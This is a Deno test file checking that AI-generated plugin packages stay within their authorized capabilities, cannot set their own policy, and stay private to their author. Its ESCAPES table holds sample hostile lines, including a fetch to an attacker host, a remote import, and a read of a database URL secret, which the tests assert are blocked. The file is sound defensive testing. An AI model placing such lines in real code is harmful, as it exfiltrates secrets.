import { assert, assertEquals } from "@std/assert";
import { PLUGIN_AUTHORING_KIT_FILES } from "@bakery/contracts/plugin-authoring-kit";
import { PLUGIN_PACKAGE_CHECK_IDS } from "../../apps/server/src/modules/workflows/plugin-authoring/checks.ts";
import {
  authored,
  count,
  counterPackage,
  localDenoRuntime,
  manifest,
  previewRunner,
  scriptedGenerator,
  startRun,
  withAuthoringFixture,
} from "../helpers/plugin-authoring-fixture.ts";
import {
  asCookie,
  inviteColleague,
  secondOrganization,
} from "../helpers/plugin-pages-fixture.ts";

/**
 * The authoring boundary (#45, B14.04): a generated package cannot take
 * authority it was not given, cannot reach the network, the environment or
 * code outside itself, cannot set the policy it is checked against, and a run
 * is visible and revisable only by its author in its own organization.
 */

const JOB = PLUGIN_AUTHORING_KIT_FILES["example/job.ts"];

const ESCAPES: Record<string, string> = {
  "fetch": `await fetch("https://attacker.example/steal");\n${JOB}`,
  "Deno.env": `const token = Deno.env.get("BAKERY_APP_DATABASE_URL");\n${JOB}`,
  "remote import": `import "https://attacker.example/x.ts";\n${JOB}`,
  "dynamic import": `const m = await import("./job.ts");\n${JOB}`,
  "eval": `eval("1 + 1");\n${JOB}`,
};

for (const [name, job] of Object.entries(ESCAPES)) {
  Deno.test(`an isolation escape is blocked and nothing is published: ${name}`, () => {
    const generator = scriptedGenerator([counterPackage({ "job.ts": job })]);
    const preview = previewRunner(localDenoRuntime());
    return withAuthoringFixture({ generator, preview }, async ({ fixture }) => {
      const versions = await count(fixture, "plugin_versions");
      const run = await authored(fixture, { maxAttempts: 1 });
      assertEquals(run.status, "blocked");
      assert(
        run.attempts[0].diagnostics.some((d: { check: string; code: string }) =>
          d.check === "isolation" && d.code === "ISOLATION_VIOLATION"
        ),
        JSON.stringify(run.attempts[0].diagnostics),
      );
      assertEquals(preview.results, []);
      assertEquals(await count(fixture, "plugin_versions"), versions);
    });
  });
}

Deno.test("a capability beyond the authorized set is refused on every attempt", () => {
  const generator = scriptedGenerator([
    counterPackage({
      "manifest.json": manifest({
        requestedCapabilities: ["state.read", "state.write", "tools.invoke"],
      }),
    }),
  ]);
  const preview = previewRunner(localDenoRuntime());
  return withAuthoringFixture({ generator, preview }, async ({ fixture }) => {
    const installs = await count(fixture, "plugin_installs");
    const run = await authored(fixture, { maxAttempts: 2 });
    assertEquals(run.status, "blocked");
    for (const attempt of run.attempts) {
      assert(
        attempt.diagnostics.some((d: { code: string }) =>
          d.code === "AUTHORITY_EXCEEDED"
        ),
      );
    }
    assertEquals(await count(fixture, "plugin_installs"), installs);
  });
});

Deno.test("policy fields a generator writes are ignored: the request's authorization decides", () => {
  const generator = scriptedGenerator([
    counterPackage({
      "policy.json": JSON.stringify({
        authorizedCapabilities: ["state.read", "state.write", "jobs.schedule"],
      }),
      "manifest.json": manifest({
        requestedCapabilities: ["state.read", "state.write", "jobs.schedule"],
      }),
    }),
  ]);
  const preview = previewRunner(localDenoRuntime());
  return withAuthoringFixture({ generator, preview }, async ({ fixture }) => {
    const run = await authored(fixture, { maxAttempts: 1 });
    assertEquals(run.status, "blocked");
    assertEquals(run.authorizedCapabilities, ["state.read", "state.write"]);
    assertEquals(
      run.attempts[0].diagnostics.map((d: { code: string }) => d.code),
      ["AUTHORITY_EXCEEDED"],
    );
    // The generator was never shown a policy to edit.
    assertEquals(
      Object.keys(generator.inputs[0]).sort(),
      ["kit", "request"],
    );
  });
});

Deno.test("repair attempts are checked by the identical check list", () => {
  const generator = scriptedGenerator([
    counterPackage({ "job.ts": `eval("1");\n${JOB}` }),
    counterPackage({ "manifest.json": "{ not json" }),
    counterPackage(),
  ]);
  const preview = previewRunner(localDenoRuntime());
  return withAuthoringFixture({ generator, preview }, async ({ fixture }) => {
    const run = await authored(fixture);
    assertEquals(run.status, "succeeded", JSON.stringify(run.attempts));
    assertEquals(run.attempts.length, 3);
    for (const attempt of run.attempts) {
      assertEquals(
        attempt.checkReport.checks.map((check: { id: string }) => check.id),
        [...PLUGIN_PACKAGE_CHECK_IDS],
      );
    }
  });
});

Deno.test("a run is its author's: a colleague and another organization cannot read or revise it", () => {
  const generator = scriptedGenerator([counterPackage()]);
  const preview = previewRunner(localDenoRuntime());
  return withAuthoringFixture({ generator, preview }, async ({ fixture }) => {
    const run = await authored(fixture);
    assertEquals(run.status, "succeeded");

    const colleague = asCookie(
      fixture,
      await inviteColleague(fixture, "admin"),
    );
    const read = await colleague(`/v1/plugin-authoring-runs/${run.id}`, {
      method: "GET",
    });
    assertEquals(read.status, 404);
    await read.body?.cancel();
    // Even an Admin cannot revise somebody else's private install through a run.
    const runs = await count(fixture, "plugin_authoring_runs");
    const revise = await colleague("/v1/plugin-authoring-runs", {
      method: "POST",
      body: {
        request: "Take over this plugin.",
        authorizedCapabilities: ["state.read", "state.write"],
        budgetUsd: "1",
        maxAttempts: 1,
        installId: run.pluginInstallId,
      },
    });
    assertEquals(revise.status, 404);
    await revise.body?.cancel();
    assertEquals(await count(fixture, "plugin_authoring_runs"), runs);

    const other = await secondOrganization(fixture);
    const foreign = await fixture.app.fetch(
      new Request(
        `${fixture.config.publicBaseUrl}/v1/plugin-authoring-runs/${run.id}`,
        {
          headers: {
            Origin: fixture.config.publicBaseUrl,
            Cookie: fixture.adminCookie,
            "Bakery-Organization-Id": other.organizationId,
          },
        },
      ),
    );
    assertEquals(foreign.status, 404);
    await foreign.body?.cancel();
  });
});

Deno.test("more than three attempts is refused before anything runs", () =>
  withAuthoringFixture({
    generator: scriptedGenerator([counterPackage()]),
    preview: previewRunner(localDenoRuntime()),
  }, async ({ fixture }) => {
    const runs = await count(fixture, "plugin_authoring_runs");
    const response = await startRun(fixture, { maxAttempts: 4 });
    assertEquals(response.status, 400);
    await response.body?.cancel();
    assertEquals(await count(fixture, "plugin_authoring_runs"), runs);
  }));
